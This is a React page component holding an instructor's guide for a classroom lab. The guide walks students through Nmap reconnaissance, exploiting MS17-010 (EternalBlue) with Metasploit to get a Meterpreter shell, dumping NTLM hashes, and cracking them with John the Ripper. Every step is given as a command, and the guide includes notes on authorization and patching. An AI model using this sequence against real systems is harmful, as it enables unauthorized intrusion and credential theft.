import Breadcrumbs from "../../../components/Breadcrumbs";
import { View, Text, Heading, Flex } from '@aws-amplify/ui-react';

const HashItOutWithNtlm = () => {

 return (
  <View>
    <Breadcrumbs />
    <Heading level={1}>Teaching Instructions: MS17-010 Eternal Blue & NTLM Hash Cracking with John the Ripper</Heading>

    <Heading level={2}>Objective</Heading>
    <View as="ul">
      <View as="li">Guide students through identifying and exploiting the MS17-010 vulnerability (Eternal Blue) using reconnaissance, Nmap scans, and Metasploit.</View>
      <View as="li">Assist students in configuring and delivering the exploit to gain Meterpreter shell access.</View>
      <View as="li">Teach students how to extract NTLM hashes from the victim system and crack them using John the Ripper.</View>
    </View>

    <Heading level={2}>Preparation</Heading>
    <Heading level={3}>Lab Setup:</Heading>
    <View as="ul">
      <View as="li">Ensure the attacker machine (typically running Kali Linux) has Nmap, Metasploit, and John the Ripper installed.</View>
      <View as="li">Confirm that a vulnerable target machine is available on the same network.</View>
      <View as="li">Verify that students have a basic understanding of command-line tools and network concepts (subnets, IP addressing, etc.).</View>
    </View>

    <Heading level={3}>Review Background Concepts:</Heading>
    <View as="ul">
      <View as="li">Network reconnaissance and subnet scanning with Nmap.</View>
      <View as="li">SMB vulnerabilities, specifically MS17-010 (Eternal Blue).</View>
      <View as="li">Basic usage of Metasploit (<code>msfconsole</code>), including module selection and option configuration.</View>
      <View as="li">Understanding NTLM authentication, hash extraction, and password cracking with John the Ripper.</View>
    </View>

    <Heading level={2}>Step-by-Step Teaching Guide</Heading>

    <Heading level={3}>Module 1: MS17-010: Eternal Blue Exploitation</Heading>

    <Heading level={4}>1. Reconnaissance</Heading>
    <View as="ul">
      <View as="li">
        <Text fontWeight="bold">Instructions for Students:</Text>
        <View as="ul">
          <View as="li">Open a terminal on the attacker machine.</View>
          <View as="li">Determine your network’s subnet mask using command-line tools. Instruct students to run:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>ip a</code>
            </View>
            to identify their IP address and subnet mask.
          </View>
          <View as="li">Using the subnet information, perform an Nmap scan on your network by appending <code>.0/24</code> to your IP range. For example:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>nmap 192.168.0.0/24</code>
            </View>
          </View>
        </View>
      </View>
      <View as="li">
        <Text fontWeight="bold">Teacher Tips & Troubleshooting:</Text>
        <View as="ul">
          <View as="li">Help students identify the correct network interface (e.g., <code>eth0</code> or <code>wlan0</code>).</View>
          <View as="li">Ensure they understand how to interpret Nmap output and identify potential target IP addresses.</View>
        </View>
      </View>
    </View>

    <Heading level={4}>2. Scanning for Vulnerabilities</Heading>
    <View as="ul">
      <View as="li">
        <Text fontWeight="bold">Instructions for Students:</Text>
        <View as="ul">
          <View as="li">Run the following Nmap commands to scan for the MS17-010 vulnerability on the target machine:
            <View as="ul">
              <View as="li"><code>nmap -p445 --script vuln &lt;ip_address&gt;</code></View>
              <View as="li"><code>nmap -p139 --script smb-vuln-ms17-010 &lt;ip_address&gt;</code></View>
            </View>
          </View>
          <View as="li">Review the scan results to confirm the presence of the MS17-010 vulnerability.</View>
        </View>
      </View>
      <View as="li">
        <Text fontWeight="bold">Teacher Tips & Troubleshooting:</Text>
        <View as="ul">
          <View as="li">Emphasize the importance of substituting <code>&lt;ip_address&gt;</code> with the actual target IP.</View>
          <View as="li">Clarify the role of each port (445 and 139) and how they relate to SMB vulnerabilities.</View>
        </View>
      </View>
    </View>

    <Heading level={4}>3. Finding and Setting Up the Exploit</Heading>
    <View as="ul">
      <View as="li">
        <Text fontWeight="bold">Instructions for Students:</Text>
        <View as="ul">
          <View as="li">Launch Metasploit by entering:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>msfconsole</code>
            </View>
          </View>
          <View as="li">Search for the Eternal Blue exploit module:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>search ms17_010</code>
            </View>
          </View>
          <View as="li">Select the exploit module (typically the first result) by typing:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>use 0</code>
            </View>
            which selects <code>exploit/windows/smb/ms17_010_eternalblue</code>.
          </View>
        </View>
      </View>
      <View as="li">
        <Text fontWeight="bold">Teacher Tips & Troubleshooting:</Text>
        <View as="ul">
          <View as="li">Walk through the Metasploit interface and explain how to search for and select modules.</View>
          <View as="li">Clarify any questions regarding the module description and why it is appropriate for the vulnerability.</View>
        </View>
      </View>
    </View>

    <Heading level={4}>4. Configuring Exploit Options</Heading>
    <View as="ul">
      <View as="li">
        <Text fontWeight="bold">Instructions for Students:</Text>
        <View as="ul">
          <View as="li">Set the target machine’s IP address (RHOST):
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>set rhosts &lt;victim_ip_address&gt;</code>
            </View>
          </View>
          <View as="li">Set your attacker machine’s IP address (LHOST):
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>set lhost &lt;attacker_ip_address&gt;</code>
            </View>
          </View>
          <View as="li">Set the listening port (LPORT):
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>set lport 4444</code>
            </View>
          </View>
          <View as="li">Verify the settings by typing:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>options</code>
            </View>
          </View>
        </View>
      </View>
      <View as="li">
        <Text fontWeight="bold">Teacher Tips & Troubleshooting:</Text>
        <View as="ul">
          <View as="li">Ensure students correctly substitute the placeholder IP addresses with actual values.</View>
          <View as="li">Discuss the purpose of each setting and why it’s necessary for a successful exploit.</View>
        </View>
      </View>
    </View>
    
 
    <Heading level={4}>5. Delivery and Verification</Heading>
    <View as="ul">
      <View as="li">
        <Text fontWeight="bold">Instructions for Students:</Text>
        <View as="ul">
          <View as="li">Execute the exploit by typing:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>run</code>
            </View>
          </View>
          <View as="li">Upon successful exploitation, use the Meterpreter command to verify access:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>sysinfo</code>
            </View>
            which should display system details of the victim machine.
          </View>
        </View>
          </View>
          <View as="li">
        <Text fontWeight="bold">Teacher Tips & Troubleshooting:</Text>
        <View as="ul">
          <View as="li">Monitor student progress and be ready to assist if the exploit does not succeed.</View>
          <View as="li">Discuss how to interpret the Meterpreter output and confirm successful shell access.</View>
        </View>
          </View>
        </View>

        <Heading level={3}>Module 2: Hashing with John the Ripper</Heading>

        <Heading level={4}>1. Collecting NTLM Hashes</Heading>
        <View as="ul">
          <View as="li">
        <Text fontWeight="bold">Instructions for Students:</Text>
        <View as="ul">
          <View as="li">Within the Meterpreter shell, extract NTLM hashes by running:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>hashdump</code>
            </View>
          </View>
          <View as="li">Identify and note the NTLM hash displayed between the <code>::</code> delimiters.
            <br /><Text fontStyle="italic">Example:</Text> <code>Administrator:500:aaee5f499:::</code>
          </View>
        </View>
          </View>
          <View as="li">
        <Text fontWeight="bold">Teacher Tips & Troubleshooting:</Text>
        <View as="ul">
          <View as="li">Ensure students understand how to locate and copy only the hash portion.</View>
          <View as="li">Emphasize accuracy to avoid extra characters or spaces in the hash file.</View>
        </View>
          </View>
        </View>

        <Heading level={4}>2. Saving the Hash for Cracking</Heading>
        <View as="ul">
          <View as="li">
        <Text fontWeight="bold">Instructions for Students:</Text>
        <View as="ul">
          <View as="li">Create a new file using a text editor (e.g., nano):
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>nano hash.txt</code>
            </View>
          </View>
          <View as="li">Paste only the extracted NTLM hash into the file and save it.</View>
        </View>
          </View>
          <View as="li">
        <Text fontWeight="bold">Teacher Tips & Troubleshooting:</Text>
        <View as="ul">
          <View as="li">Verify that the file contains solely the NTLM hash and no additional formatting.</View>
        </View>
          </View>
        </View>

        <Heading level={4}>3. Running John the Ripper</Heading>
        <View as="ul">
          <View as="li">
        <Text fontWeight="bold">Instructions for Students:</Text>
        <View as="ul">
          <View as="li">Initiate John the Ripper to crack the NTLM hash by running:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>john --format=NT hash.txt</code>
            </View>
          </View>
        </View>
          </View>
          <View as="li">
        <Text fontWeight="bold">Teacher Tips & Troubleshooting:</Text>
        <View as="ul">
          <View as="li">Explain the purpose of the command and its parameters.</View>
          <View as="li">Advise students to be patient while the cracking process completes.</View>
        </View>
          </View>
        </View>

        <Heading level={4}>4. Viewing Cracked Passwords</Heading>
        <View as="ul">
          <View as="li">
        <Text fontWeight="bold">Instructions for Students:</Text>
        <View as="ul">
          <View as="li">Once John the Ripper has finished, display the cracked password by running:
            <View backgroundColor="#f8f9fa" border="2px solid #ced4da" padding="10px" margin="10px 0">
              <code>john --show hash.txt</code>
            </View>
          </View>
        </View>
          </View>
          <View as="li">
        <Text fontWeight="bold">Teacher Tips & Troubleshooting:</Text>
        <View as="ul">
          <View as="li">Discuss the importance of password strength and the risks posed by weak passwords.</View>
          <View as="li">Review the output format so students understand what is being displayed.</View>
        </View>
          </View>
        </View>

        <Heading level={3}>Reflection & Discussion</Heading>
        <View as="ul">
          <View as="li">Ask students to summarize the steps they took in both modules.</View>
          <View as="li">Discuss the importance of patching vulnerabilities like MS17-010 to prevent exploits.</View>
          <View as="li">Highlight the ethical and legal implications of exploiting vulnerabilities and cracking passwords.</View>
          <View as="li">Encourage questions and discussion about any challenges encountered during the lab.</View>
        </View>

        <Heading level={2}>Additional Reminders for the Teacher</Heading>
        <View as="ul">
          <View as="li">Ensure all activities are performed in a controlled, legal environment with proper authorization.</View>
          <View as="li">Provide step-by-step guidance and troubleshooting support throughout the lab.</View>
          <View as="li">Encourage students to document their processes and learnings for future reference.</View>
          <View as="li">Emphasize the responsible and ethical use of cybersecurity tools.</View>
        </View>
      </View>
    
 );
};

export default HashItOutWithNtlm;

